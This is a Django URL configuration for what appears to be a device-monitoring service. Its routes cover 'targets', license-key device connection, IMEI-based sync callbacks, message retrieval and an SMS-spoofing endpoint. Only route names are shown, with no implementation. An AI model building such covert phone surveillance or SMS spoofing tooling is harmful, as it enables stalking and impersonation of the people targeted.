from django.urls import path
from .views import (SigninView, SignUpView,
                    VerifyEmailView, ProfileView, TargetsView, MessagesView, SyncTargetView, SpoofSMSView)
from .apis import ConnectTargetView, SyncCallbackView

urlpatterns = [
    path("signin/", SigninView.as_view(), name="signin"),
    path("signup/", SignUpView.as_view(), name="signup"),
    path("verify/<uidb64>/<token>/",
         VerifyEmailView.as_view(), name="verify-email"),
    path("profile/", ProfileView.as_view(), name="profile"),
    path("targets/", TargetsView.as_view(), name="targets"),
    path("targets/<uuid:target_id>/", TargetsView.as_view(), name="targets"),
    path("connect/<str:license_key>/",
         ConnectTargetView.as_view(), name="connect"),
    path("messages/", MessagesView.as_view(), name="messages"),
    path("sync/<str:sync_type>/", SyncTargetView.as_view(), name="sync"),
    path("sync-callback/<str:license_key>/<str:device_imei>/<str:target_id>/<str:sync_type>/",
         SyncCallbackView.as_view(), name="sync-callback"),
    path("spoof-sms/", SpoofSMSView.as_view(), name="spoof-sms"),
]
